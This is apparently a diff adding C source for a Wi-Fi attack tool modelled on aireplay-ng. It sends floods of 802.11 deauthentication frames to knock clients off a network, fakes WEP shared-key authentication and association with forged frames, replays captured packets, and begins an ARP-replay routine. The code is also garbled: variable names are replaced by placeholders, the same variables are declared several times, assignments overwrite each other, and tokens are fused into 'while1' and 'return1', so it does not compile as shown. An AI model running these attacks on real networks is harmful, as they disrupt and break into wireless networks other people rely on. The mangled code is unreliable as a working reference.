+            pack_size = var_71 + 4 + var_71;
+        else
+            pack_size = var_71 + 4 + (var_71-(var_71+t-var_71));
+
+
+        add_icv(frag, pack_size, var_71 + 4);
+        pack_size += 4;
+
+
+        xor_keystream(frag + var_71 + 4, keystream, var_71+4);
+
+
+        send_packet(frag, pack_size);
+        if (t<data_size)usleep(100);
+
+        if (t>=data_size) break;
+    }
+
+}
+
+int fn_71( void )
+{
+    int var_122, var_122;
+    int aacks, sacks, var_117;
+    struct struct_112 tv;
+    fd_set rfds;
+
+    if(getnet(NULL, 0, 1) != 0)
+        return 1;
+
+    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )
+        printf( "NB: this attack is more effective when targeting\n"
+                "a connected wireless client (-c <client's mac>).\n" );
+
+    var_122 = 0;
+
+    while1
+    {
+        if( opt.a_count > 0 && ++var_122 > opt.a_count )
+            break;
+
+        usleep( 180000 );
+
+        if( memcmp( opt.r_dmac, NULL_MAC, 6 ) != 0 )
+        {
+
+
+            memcpy( h80211, "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00", 26 );
+            memcpy( h80211 + 16, opt.r_bssid, 6 );
+
+            aacks = 0;
+            sacks = 0;
+            for( var_122 = 0; var_122 < 64; var_122++ )
+            {
+                if(var_122 == 0)
+                {
+                    PCT; printf( "Sending 64 directed DeAuth. STMAC:"
+                                " [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\r",
+                                opt.r_dmac[0], opt.r_dmac[1],
+                                opt.r_dmac[2], opt.r_dmac[3],
+                                opt.r_dmac[4], opt.r_dmac[5],
+                                sacks, aacks );
+                }
+
+                memcpy( h80211 + 4, opt.r_dmac, 6 );
+                memcpy( h80211 + 10, opt.r_bssid, 6 );
+
+                if( send_packet( h80211, 26 ) < 0 )
+                    return1;
+
+                usleep( 2000 );
+
+                memcpy( h80211 + 4, opt.r_bssid, 6 );
+                memcpy( h80211 + 10, opt.r_dmac, 6 );
+
+                if( send_packet( h80211, 26 ) < 0 )
+                    return1;
+
+                usleep( 2000 );
+
+                while1
+                {
+                    FD_ZERO( &rfds );
+                    FD_SET( dev.fd_in, &rfds );
+
+                    tv.tv_sec = 0;
+                    tv.tv_usec = 1000;
+
+                    if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
+                    {
+                        if( errno == EINTR ) continue;
+                        perror( "select failed" );
+                        return1;
+                    }
+
+                    if( ! FD_ISSET( dev.fd_in, &rfds ) )
+                        break;
+
+                    var_117 = read_packet( tmpbuf, sizeof( tmpbuf ), NULL );
+
+                    if(var_117 <= 0 ) break;
+                    if(var_117 != 10) continue;
+                    if( tmpbuf[0] == 0xD4)
+                    {
+                        if( memcmp(tmpbuf+4, opt.r_dmac, 6) == 0 )
+                        {
+                            aacks++;
+                        }
+                        if( memcmp(tmpbuf+4, opt.r_bssid, 6) == 0 )
+                        {
+                            sacks++;
+                        }
+                        PCT; printf( "Sending 64 directed DeAuth. STMAC:"
+                                    " [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\r",
+                                    opt.r_dmac[0], opt.r_dmac[1],
+                                    opt.r_dmac[2], opt.r_dmac[3],
+                                    opt.r_dmac[4], opt.r_dmac[5],
+                                    sacks, aacks );
+                    }
+                }
+            }
+            printf("\n");
+        }
+        else
+        {
+
+
+            PCT; printf( "Sending DeAuth to broadcast -- BSSID:"
+                         " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
+                         opt.r_bssid[0], opt.r_bssid[1],
+                         opt.r_bssid[2], opt.r_bssid[3],
+                         opt.r_bssid[4], opt.r_bssid[5] );
+
+            memcpy( h80211, "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00", 26 );
+
+            memcpy( h80211 + 4, BROADCAST, 6 );
+            memcpy( h80211 + 10, opt.r_bssid, 6 );
+            memcpy( h80211 + 16, opt.r_bssid, 6 );
+
+            for( var_122 = 0; var_122 < 128; var_122++ )
+            {
+                if( send_packet( h80211, 26 ) < 0 )
+                    return1;
+
+                usleep( 2000 );
+            }
+        }
+    }
+
+    return0;
+}
+
+int fn_72( void )
+{
+    time_t tt, tr;
+    struct struct_112 tv, tv2, tv3;
+
+    fd_set rfds;
+    int var_122, var_122, state, var_117, z;
+    int var_82, var_82, var_82;
+    int x_send;
+    int kas;
+    int tries;
+    int var_81 = 0;
+    int abort;
+    int var_81 = 0;
+    unsigned char capa[2];
+    int var_81=3;
+    int var_81=0;
+    int var_81=0;
+    int var_81=0;
+    int weight[16];
+    int var_81=0;
+    int var_100=0;
+    int var_81=0;
+
+    unsigned char ackbuf[14];
+    unsigned char ctsbuf[10];
+    unsigned char iv[4];
+    unsigned char challenge[2048];
+    unsigned char keystream[2048];
+
+
+    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )
+    {
+        printf( "Please specify a source MAC (-h).\n" );
+        return1;
+    }
+
+    if(getnet(capa, 0, 1) != 0)
+        return 1;
+
+    if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)
+    {
+        printf( "Please specify an ESSID (-e).\n" );
+        return 1;
+    }
+
+    memcpy( ackbuf, "\xD4\x00\x00\x00", 4 );
+    memcpy( ackbuf + 4, opt.r_bssid, 6 );
+    memset( ackbuf + 10, 0, 4 );
+
+    memcpy( ctsbuf, "\xC4\x00\x94\x02", 4 );
+    memcpy( ctsbuf + 4, opt.r_bssid, 6 );
+
+    tries = 0;
+    abort = 0;
+    state = 0;
+    x_send=opt.npackets;
+    if(opt.npackets == 0)
+        x_send=4;
+
+    if(opt.prga != NULL)
+        var_81=1;
+
+    tt = time( NULL );
+    tr = time( NULL );
+
+    while1
+    {
+        switch( state )
+        {
+            case 0:
+    if (opt.f_retry > 0) {
+     if (var_81 == opt.f_retry) {
+      abort = 1;
+      return 1;
+     }
+     ++var_81;
+    }
+
+                if(var_81 && var_81 == 0)
+                {
+                    opt.fast = 1;
+                    memcpy(opt.f_bssid, opt.r_bssid, 6);
+                    if(opt.prga==NULL)
+                    {
+                        while(var_81 < 16)
+                        {
+                            capture_ask_packet(&var_117, 1);
+                            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+                            if ( ( h80211[0] & 0x80 ) == 0x80 )
+                                z+=2;
+
+                            memcpy(iv, h80211+z, 4);
+                            var_122 = known_clear(keystream, &var_81, weight, h80211, var_117-z-4-4);
+                            if(var_122>1)
+                            {
+                                var_81=0;
+                            }
+                            for(var_122=0;var_122<var_81;var_122++)
+                                keystream[var_122] ^= h80211[var_122+z+4];
+                        }
+                    }
+                    else
+                    {
+                        var_81 = opt.prgalen-4;
+                        memcpy(iv, opt.prga, 4);
+                        memcpy(keystream, opt.prga+4, var_81);
+                    }
+                }
+
+                state = 1;
+                tt = time( NULL );
+
+
+
+                memcpy( h80211, "\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" "\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00", 30 );
+                memcpy( h80211 + 4, opt.r_bssid, 6 );
+                memcpy( h80211 + 10, opt.r_smac , 6 );
+                memcpy( h80211 + 16, opt.r_bssid, 6 );
+                if(var_81)
+                    h80211[24]=0x01;
+
+                printf("\n");
+                PCT; printf( "Sending Authentication Request" );
+                if(!var_81)
+                    printf(" (Open System)");
+                else
+                    printf(" (Shared Key)");
+                fflush( stdout );
+                var_81=0;
+
+                for( var_122 = 0; var_122 < x_send; var_122++ )
+                {
+                    if( send_packet( h80211, 30 ) < 0 )
+                        return1;
+
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return1;
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return1;
+                }
+
+                break;
+
+            case 1:
+
+
+
+                if( time( NULL ) - tt >= 2 )
+                {
+                    if(opt.npackets > 0)
+                    {
+                        tries++;
+
+                        if( tries > 15 )
+                        {
+                            abort = 1;
+                        }
+                    }
+                    else
+                    {
+                        if( x_send < 256 )
+                        {
+                            x_send *= 2;
+                        }
+                        else
+                        {
+                            abort = 1;
+                        }
+                    }
+
+                    if( abort )
+                    {
+                        printf(
+    "\nAttack was unsuccessful. Possible reasons:\n\n"
+    "    * Perhaps MAC address filtering is enabled.\n"
+    "    * Check that the BSSID (-a option) is correct.\n"
+    "    * Try to change the number of packets (-o option).\n"
+    "    * The driver/card doesn't support injection.\n"
+    "    * This attack sometimes fails against some APs.\n"
+    "    * The card is not on the same channel as the AP.\n"
+    "    * You're too far from the AP. Get closer, or lower\n"
+    "      the transmit rate.\n\n" );
+                        return1;
+                    }
+
+                    state = 0;
+                    var_81 = 0;
+                    printf("\n");
+                }
+
+                break;
+
+            case 2:
+
+                state = 3;
+                tt = time( NULL );
+
+
+
+                memcpy( h80211, "\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" "\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00", 30 );
+                memcpy( h80211 + 4, opt.r_bssid, 6 );
+                memcpy( h80211 + 10, opt.r_smac , 6 );
+                memcpy( h80211 + 16, opt.r_bssid, 6 );
+                h80211[1] |= 0x40;
+                memcpy(h80211+24, iv, 4);
+                memcpy(h80211+28, challenge, var_81);
+                h80211[28] = 0x01;
+                h80211[30] = 0x03;
+                fflush(stdout);
+
+                if(var_81 < var_81+4 && var_81 == 0)
+                {
+                    var_81 = 1;
+                    if(opt.prga != NULL)
+                    {
+                        PCT; printf( "Specified xor file (-y) is too short, you need at least %d keystreambytes.\n", var_81+4);
+                    }
+                    else
+                    {
+                        PCT; printf( "You should specify a xor file (-y) with at least %d keystreambytes\n", var_81+4);
+                    }
+                    PCT; printf( "Trying fragmented shared key fake auth.\n");
+                }
+                PCT; printf( "Sending encrypted challenge." );
+                fflush( stdout );
+                var_81=0;
+                gettimeofday(&tv2, NULL);
+
+                for( var_122 = 0; var_122 < x_send; var_122++ )
+                {
+                    if(var_81 < var_81+4)
+                    {
+                        var_100=(var_81)/(var_81-4);
+                        if( (var_81)%(var_81-4) != 0 )
+                            var_100++;
+
+                        memcpy(h80211+24, challenge, var_81);
+                        h80211[24]=0x01;
+                        h80211[26]=0x03;
+                        send_fragments(h80211, var_81+24, iv, keystream, var_81-4, 1);
+                    }
+                    else
+                    {
+                        add_icv(h80211, var_81+28, 28);
+                        xor_keystream(h80211+28, keystream, var_81+4);
+                        send_packet(h80211, 28+var_81+4);
+                    }
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return1;
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return1;
+                }
+
+                break;
+
+            case 3:
+
+
+
+                if( time( NULL ) - tt >= 2 )
+                {
+                    if(opt.npackets > 0)
+                    {
+                        tries++;
+
+                        if( tries > 15 )
+                        {
+                            abort = 1;
+                        }
+                    }
+                    else
+                    {
+                        if( x_send < 256 )
+                        {
+                            x_send *= 2;
+                        }
+                        else
+                        {
+                            abort = 1;
+                        }
+                    }
+
+                    if( abort )
+                    {
+                        printf(
+    "\nAttack was unsuccessful. Possible reasons:\n\n"
+    "    * Perhaps MAC address filtering is enabled.\n"
+    "    * Check that the BSSID (-a option) is correct.\n"
+    "    * Try to change the number of packets (-o option).\n"
+    "    * The driver/card doesn't support injection.\n"
+    "    * This attack sometimes fails against some APs.\n"
+    "    * The card is not on the same channel as the AP.\n"
+    "    * You're too far from the AP. Get closer, or lower\n"
+    "      the transmit rate.\n\n" );
+                        return1;
+                    }
+
+                    state = 0;
+                    var_81=0;
+                    printf("\n");
+                }
+
+                break;
+
+            case 4:
+
+                tries = 0;
+                state = 5;
+                if(opt.npackets == -1) x_send *= 2;
+                tt = time( NULL );
+
+
+
+                memcpy( h80211, "\x00\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" "\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00", 28 );
+                memcpy( h80211 + 4, opt.r_bssid, 6 );
+                memcpy( h80211 + 10, opt.r_smac , 6 );
+                memcpy( h80211 + 16, opt.r_bssid, 6 );
+
+                var_122 = strlen( opt.r_essid );
+                if( var_122 > 32 ) var_122 = 32;
+
+                h80211[28] = 0x00;
+                h80211[29] = var_122;
+
+                memcpy( h80211 + 30, opt.r_essid, var_122 );
+                memcpy( h80211 + 30 + var_122, "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C", 16 );
+                memcpy( h80211 + 24, capa, 2);
+
+                PCT; printf( "Sending Association Request" );
+                fflush( stdout );
+                var_81=0;
+
+                for( var_122 = 0; var_122 < x_send; var_122++ )
+                {
+                    if( send_packet( h80211, 46 + var_122 ) < 0 )
+                        return1;
+
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return1;
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return1;
+                }
+
+                break;
+
+            case 5:
+
+
+
+                if( time( NULL ) - tt >= 5 )
+                {
+                    if( x_send < 256 && (opt.npackets == -1) )
+                        x_send *= 4;
+
+                    state = 0;
+                    var_81 = 0;
+                    printf("\n");
+                }
+
+                break;
+
+            case 6:
+
+                if( opt.a_delay == 0 && opt.reassoc == 0 )
+                {
+                    printf("\n");
+                    return0;
+                }
+
+                if( opt.a_delay == 0 && opt.reassoc == 1 )
+                {
+                    if(opt.npackets == -1) x_send = 4;
+                    state = 7;
+                    var_81 = 0;
+                    break;
+                }
+
+                if( time( NULL ) - tt >= opt.a_delay )
+                {
+                    if(opt.npackets == -1) x_send = 4;
+                    if( opt.reassoc == 1 ) state = 7;
+                    else state = 0;
+                    var_81 = 0;
+                    break;
+                }
+
+                if( time( NULL ) - tr >= opt.delay )
+                {
+                    tr = time( NULL );
+                    printf("\n");
+                    PCT; printf( "Sending keep-alive packet" );
+                    fflush( stdout );
+                    var_81=0;
+
+                    memcpy( h80211, "\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B", 24 );
+                    memcpy( h80211 + 4, opt.r_bssid, 6 );
+                    memcpy( h80211 + 10, opt.r_smac, 6 );
+                    memcpy( h80211 + 16, opt.r_bssid, 6 );
+
+                    if( opt.npackets > 0 ) kas = opt.npackets;
+                    else kas = 32;
+
+                    for( var_122 = 0; var_122 < kas; var_122++ )
+                        if( send_packet( h80211, 24 ) < 0 )
+                            return1;
+                }
+
+                break;
+
+            case 7:
+
+
+
+                tries = 0;
+                state = 8;
+                if(opt.npackets == -1) x_send *= 2;
+                tt = time( NULL );
+
+
+
+                memcpy( h80211, "\x20\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" "\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00\x00\x00\x00\x00\x00\x00", 34 );
+                memcpy( h80211 + 4, opt.r_bssid, 6 );
+                memcpy( h80211 + 10, opt.r_smac , 6 );
+                memcpy( h80211 + 16, opt.r_bssid, 6 );
+
+                var_122 = strlen( opt.r_essid );
+                if( var_122 > 32 ) var_122 = 32;
+
+                h80211[34] = 0x00;
+                h80211[35] = var_122;
+
+                memcpy( h80211 + 36, opt.r_essid, var_122 );
+                memcpy( h80211 + 36 + var_122, "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C", 16 );
+                memcpy( h80211 + 30, capa, 2);
+
+                PCT; printf( "Sending Reassociation Request" );
+                fflush( stdout );
+                var_81=0;
+
+                for( var_122 = 0; var_122 < x_send; var_122++ )
+                {
+                    if( send_packet( h80211, 52 + var_122 ) < 0 )
+                        return1;
+
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return1;
+                    usleep(10);
+
+                    if( send_packet( ackbuf, 14 ) < 0 )
+                        return1;
+                }
+
+                break;
+
+            case 8:
+
+
+
+                if( time( NULL ) - tt >= 5 )
+                {
+                    if( x_send < 256 && (opt.npackets == -1) )
+                        x_send *= 4;
+
+                    state = 7;
+                    var_81 = 0;
+                    printf("\n");
+                }
+
+                break;
+
+            default: break;
+        }
+
+
+
+        FD_ZERO( &rfds );
+        FD_SET( dev.fd_in, &rfds );
+
+        tv.tv_sec = 1;
+        tv.tv_usec = 0;
+
+        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
+        {
+            if( errno == EINTR ) continue;
+            perror( "select failed" );
+            return1;
+        }
+
+        if( ! FD_ISSET( dev.fd_in, &rfds ) )
+            continue;
+
+        var_117 = read_packet( h80211, sizeof( h80211 ), NULL );
+
+        if( var_117 < 0 ) return1;
+        if( var_117 == 0 ) continue;
+
+        if( var_117 == 10 && h80211[0] == 0xD4)
+        {
+            if( memcmp(h80211+4, opt.r_smac, 6) == 0 )
+            {
+                var_81++;
+                if(var_81==1)
+                {
+                    printf(" [ACK]");
+                    fflush( stdout );
+                }
+            }
+        }
+
+        gettimeofday(&tv3, NULL);
+
+
+        if ( (((tv3.tv_sec*1000000 - tv2.tv_sec*1000000) + (tv3.tv_usec - tv2.tv_usec)) > 100000) &&
+              (var_81 > 0) && (var_81 < var_100) && (state == 3) && (var_100 > 1) )
+        {
+            PCT; printf("Not enough acks, repeating...\n");
+            state=2;
+            continue;
+        }
+
+        if( var_117 < 24 )
+            continue;
+
+        switch( h80211[1] & 3 )
+        {
+            case 0: var_82 = 16; var_82 = 10; var_82 = 4; break;
+            case 1: var_82 = 4; var_82 = 10; var_82 = 16; break;
+            case 2: var_82 = 10; var_82 = 16; var_82 = 4; break;
+            default: var_82 = 10; var_82 = 16; var_82 = 24; break;
+        }
+
+
+
+        if( memcmp( h80211 + var_82, opt.r_smac, 6 ) == 0 &&
+            memcmp( h80211 + var_82, opt.r_bssid, 6 ) == 0 &&
+            memcmp( h80211 + var_82, opt.r_bssid, 6 ) == 0 )
+        {
+
+
+            if( h80211[0] == 0xC0 )
+            {
+                printf("\n");
+                PCT; printf( "Got a deauthentication packet! (Waiting %d seconds)\n", var_81 );
+                if(opt.npackets == -1) x_send = 4;
+                state = 0;
+                var_81 = 0;
+                read_sleep( var_81 * 1000000 );
+                var_81 += 2;
+                continue;
+            }
+
+
+
+            if( h80211[0] == 0xA0 && state == 6 )
+            {
+                printf("\n");
+                PCT; printf( "Got a disassociation packet! (Waiting %d seconds)\n", var_81 );
+                if(opt.npackets == -1) x_send = 4;
+                state = 0;
+                var_81 = 0;
+                read_sleep( var_81 );
+                var_81 += 2;
+                continue;
+            }
+
+
+
+            if( h80211[0] == 0xB0 && (state == 1 || state == 3) )
+            {
+                if(var_81)
+                {
+                    if( (state==1 && h80211[26] != 0x02) || (state==3 && h80211[26] != 0x04) )
+                        continue;
+                }
+
+                printf("\n");
+                PCT;
+
+                state = 0;
+
+                if( var_117 < 30 )
+                {
+                    printf( "Error: packet length < 30 bytes\n" );
+                    read_sleep( 3000000 );
+                    var_81 = 0;
+                    continue;
+                }
+
+                if( (h80211[24] != 0 || h80211[25] != 0) && var_81==0)
+                {
+                    var_81=1;
+                    printf("Switching to shared key authentication\n");
+                    read_sleep(2000000);
+                    var_81 = 0;
+                    continue;
+                }
+
+                var_122 = h80211[28] + ( h80211[29] << 8 );
+
+                if( var_122 != 0 )
+                {
+                    switch( var_122 )
+                    {
+                    case 1:
+                        printf( "AP rejects the source MAC address (%02X:%02X:%02X:%02X:%02X:%02X) ?\n",
+                                opt.r_smac[0], opt.r_smac[1], opt.r_smac[2],
+                                opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );
+                        break;
+
+                    case 10:
+                        printf( "AP rejects our capabilities\n" );
+                        break;
+
+                    case 13:
+                    case 15:
+                        var_81=1;
+                        if(h80211[26] == 0x02)
+                            printf("Switching to shared key authentication\n");
+                        if(h80211[26] == 0x04)
+                        {
+                            printf("Challenge failure\n");
+                            var_81=0;
+                        }
+                        read_sleep(2000000);
+                        var_81 = 0;
+                        continue;
+                    default:
+                        break;
+                    }
+
+                    printf( "Authentication failed (code %d)\n", var_122 );
+                    if(opt.npackets == -1) x_send = 4;
+                    read_sleep( 3000000 );
+                    var_81 = 0;
+                    continue;
+                }
+
+                if(var_81 && h80211[26]==0x02 && var_81 == 0)
+                {
+                    memcpy(challenge, h80211+24, var_117-24);
+                    var_81=var_117-24;
+                }
+                if(var_81)
+                {
+                    if(h80211[26]==0x02)
+                    {
+                        state = 2;
+                        printf( "Authentication 1/2 successful\n" );
+                    }
+                    if(h80211[26]==0x04)
+                    {
+                        state = 4;
+                        printf( "Authentication 2/2 successful\n" );
+                    }
+                }
+                else
+                {
+                    printf( "Authentication successful\n" );
+                    state = 4;
+                }
+            }
+
+
+
+            if( h80211[0] == 0x10 && state == 5 )
+            {
+                printf("\n");
+                state = 0; PCT;
+
+                if( var_117 < 30 )
+                {
+                    printf( "Error: packet length < 30 bytes\n" );
+                    sleep( 3 );
+                    var_81 = 0;
+                    continue;
+                }
+
+                var_122 = h80211[26] + ( h80211[27] << 8 );
+
+                if( var_122 != 0 )
+                {
+                    switch( var_122 )
+                    {
+                    case 1:
+                        printf( "Denied (code  1), is WPA in use ?\n" );
+                        break;
+
+                    case 10:
+                        printf( "Denied (code 10), open (no WEP) ?\n" );
+                        break;
+
+                    case 12:
+                        printf( "Denied (code 12), wrong ESSID or WPA ?\n" );
+                        break;
+
+                    default:
+                        printf( "Association denied (code %d)\n", var_122 );
+                        break;
+                    }
+
+                    sleep( 3 );
+                    var_81 = 0;
+                    continue;
+                }
+
+                var_81=( ( (h80211[29] << 8) || (h80211[28]) ) & 0x3FFF);
+                printf( "Association successful :-) (AID: %d)\n", var_81 );
+                var_81 = 3;
+                fflush( stdout );
+
+                tt = time( NULL );
+                tr = time( NULL );
+
+                state = 6;
+            }
+
+
+
+            if( h80211[0] == 0x30 && state == 8 )
+            {
+                printf("\n");
+                state = 7; PCT;
+
+                if( var_117 < 30 )
+                {
+                    printf( "Error: packet length < 30 bytes\n" );
+                    sleep( 3 );
+                    var_81 = 0;
+                    continue;
+                }
+
+                var_122 = h80211[26] + ( h80211[27] << 8 );
+
+                if( var_122 != 0 )
+                {
+                    switch( var_122 )
+                    {
+                    case 1:
+                        printf( "Denied (code  1), is WPA in use ?\n" );
+                        break;
+
+                    case 10:
+                        printf( "Denied (code 10), open (no WEP) ?\n" );
+                        break;
+
+                    case 12:
+                        printf( "Denied (code 12), wrong ESSID or WPA ?\n" );
+                        break;
+
+                    default:
+                        printf( "Reassociation denied (code %d)\n", var_122 );
+                        break;
+                    }
+
+                    sleep( 3 );
+                    var_81 = 0;
+                    continue;
+                }
+
+                var_81=( ( (h80211[29] << 8) || (h80211[28]) ) & 0x3FFF);
+                printf( "Reassociation successful :-) (AID: %d)\n", var_81 );
+                var_81 = 3;
+                fflush( stdout );
+
+                tt = time( NULL );
+                tr = time( NULL );
+
+                state = 6;
+            }
+        }
+    }
+
+    return0;
+}
+
+int fn_81( void )
+{
+    int var_117, var_122, z;
+    int var_82, var_82, var_82;
+    struct struct_112 tv;
+    struct struct_112 tv2;
+    float f, ticks[3];
+    unsigned char bssid[6];
+    unsigned char smac[6];
+    unsigned char dmac[6];
+
+read_packets:
+
+    if( capture_ask_packet( &var_117, 0 ) != 0 )
+        return1;
+
+    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+    if ( ( h80211[0] & 0x80 ) == 0x80 )
+        z+=2;
+
+
+
+    switch( h80211[1] & 3 )
+    {
+        case 0: var_82 = 16; var_82 = 10; var_82 = 4; break;
+        case 1: var_82 = 4; var_82 = 10; var_82 = 16; break;
+        case 2: var_82 = 10; var_82 = 16; var_82 = 4; break;
+        default: var_82 = 10; var_82 = 16; var_82 = 24; break;
+    }
+
+    if( memcmp( opt.r_bssid, NULL_MAC, 6 ) == 0 )
+        memcpy( bssid, h80211 + var_82, 6 );
+    else
+        memcpy( bssid, opt.r_bssid, 6 );
+
+    if( memcmp( opt.r_smac , NULL_MAC, 6 ) == 0 )
+        memcpy( smac, h80211 + var_82, 6 );
+    else
+        memcpy( smac, opt.r_smac, 6 );
+
+    if( memcmp( opt.r_dmac , NULL_MAC, 6 ) == 0 )
+        memcpy( dmac, h80211 + var_82, 6 );
+    else
+        memcpy( dmac, opt.r_dmac, 6 );
+
+    if( opt.r_fctrl != -1 )
+    {
+        h80211[0] = opt.r_fctrl >> 8;
+        h80211[1] = opt.r_fctrl & 0xFF;
+
+        switch( h80211[1] & 3 )
+        {
+            case 0: var_82 = 16; var_82 = 10; var_82 = 4; break;
+            case 1: var_82 = 4; var_82 = 10; var_82 = 16; break;
+            case 2: var_82 = 10; var_82 = 16; var_82 = 4; break;
+            default: var_82 = 10; var_82 = 16; var_82 = 24; break;
+        }
+    }
+
+    memcpy( h80211 + var_82, bssid, 6 );
+    memcpy( h80211 + var_82, smac , 6 );
+    memcpy( h80211 + var_82, dmac , 6 );
+
+
+
+
+    printf( "You should also start airodump-ng to capture replies.\n\n" );
+
+    signal( SIGINT, sighandler );
+    ctrl_c = 0;
+
+    memset( ticks, 0, sizeof( ticks ) );
+
+    nb_pkt_sent = 0;
+
+    while1
+    {
+        if( ctrl_c )
+            goto read_packets;
+
+
+
+        if( dev.fd_rtc >= 0 )
+        {
+            if( read( dev.fd_rtc, &var_122, sizeof( var_122 ) ) < 0 )
+            {
+                perror( "read(/dev/rtc) failed" );
+                return1;
+            }
+
+            ticks[0]++;
+            ticks[1]++;
+            ticks[2]++;
+        }
+        else
+        {
+
+
+            gettimeofday( &tv, NULL );
+            usleep( 122 );
+            gettimeofday( &tv2, NULL );
+
+            f = 1000000 * (float) ( tv2.tv_sec - tv.tv_sec )
+                        + (float) ( tv2.tv_usec - tv.tv_usec );
+
+            ticks[0] += f / 122;
+            ticks[1] += f / 122;
+            ticks[2] += f / 122;
+        }
+
+
+
+        if( ticks[1] > 819 )
+        {
+            ticks[1] = 0;
+            printf( "\rSent %ld packets...(%d pps)\33[K\r", nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)8192)));
+            fflush( stdout );
+        }
+
+        if( ( ticks[2] * opt.r_nbpps ) / 8192 < 1 )
+            continue;
+
+
+
+        ticks[2] = 0;
+
+        if( nb_pkt_sent == 0 )
+            ticks[0] = 0;
+
+        if( send_packet( h80211, var_117 ) < 0 )
+            return1;
+
+        if( ((double)ticks[0]/(double)8192)*(double)opt.r_nbpps > (double)nb_pkt_sent )
+        {
+            if( send_packet( h80211, var_117 ) < 0 )
+                return1;
+        }
+    }
+
+    return0;
+}
+
+int fn_82( void )
+{
+    int nb_bad_pkt;
+    int arp_off1, arp_off2;
+    int var_122, var_122, var_117, nb_arp, z;
+    long nb_pkt_read, nb_arp_tot, nb_ack_pkt;
+
+    time_t tc;
+    float f, ticks[3];
+    struct struct_112 tv;
+    struct struct_112 tv2;
+    struct struct_99 *lt;
+
+    FILE *f_cap_out;
+    struct struct_122 pfh_out;
+    struct struct_95 pkh;
+    struct struct_85 * arp;
+
+
+
+    opt.f_type = 2;
+    opt.f_subtype = 0;
+    opt.f_iswep = 1;
+
+    memset( opt.f_dmac, 0xFF, 6 );
+
+    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )
+    {
+        printf( "Please specify a source MAC (-h).\n" );
+        return1;
+    }
+
+    if(getnet(NULL, 1, 1) != 0)
+        return 1;
+
+
+
+    gettimeofday( &tv, NULL );
+
+    pfh_out.magic = TCPDUMP_MAGIC;
+    pfh_out.version_major = PCAP_VERSION_MAJOR;
+    pfh_out.version_minor = PCAP_VERSION_MINOR;
+    pfh_out.thiszone = 0;
+    pfh_out.sigfigs = 0;
+    pfh_out.snaplen = 65535;
+    pfh_out.linktype = LINKTYPE_IEEE802_11;
+
+    lt = localtime( (const time_t *) &tv.tv_sec );
+
+    memset( strbuf, 0, sizeof( strbuf ) );
+    snprintf( strbuf, sizeof( strbuf ) - 1,
+              "replay_arp-%02d%02d-%02d%02d%02d.cap",
+              lt->tm_mon + 1, lt->tm_mday,
+              lt->tm_hour, lt->tm_min, lt->tm_sec );
+
+    printf( "Saving ARP requests in %s\n", strbuf );
+
+    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
+    {
+        perror( "fopen failed" );
+        return1;
+    }
+
+    var_122 = sizeof( struct struct_122 );
+
+    if( fwrite( &pfh_out, var_122, 1, f_cap_out ) != 1 )
+    {
+        perror( "fwrite failed\n" );
+        return1;
+    }
+
+    fflush( f_cap_out );
+
+    printf( "You should also start airodump-ng to capture replies.\n" );
+
+    if(opt.port_in <= 0)
+    {
+
+        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )
+        {
+            perror( "fcntl(O_NONBLOCK) failed" );
+            return1;
+        }
+    }
+
+    if ( opt.ringbuffer )
+        arp = (struct struct_85*) malloc( opt.ringbuffer * sizeof( struct struct_85 ) );
+    else
+        arp = (struct struct_85*) malloc( sizeof( struct struct_85 ) );
+
+    memset( ticks, 0, sizeof( ticks ) );
+
+    tc = time( NULL ) - 11;
+
+    nb_pkt_read = 0;
+    nb_bad_pkt = 0;
+    nb_ack_pkt = 0;
+    nb_arp = 0;
+    nb_arp_tot = 0;
+    arp_off1 = 0;
+    arp_off2 = 0;
+
+    while1
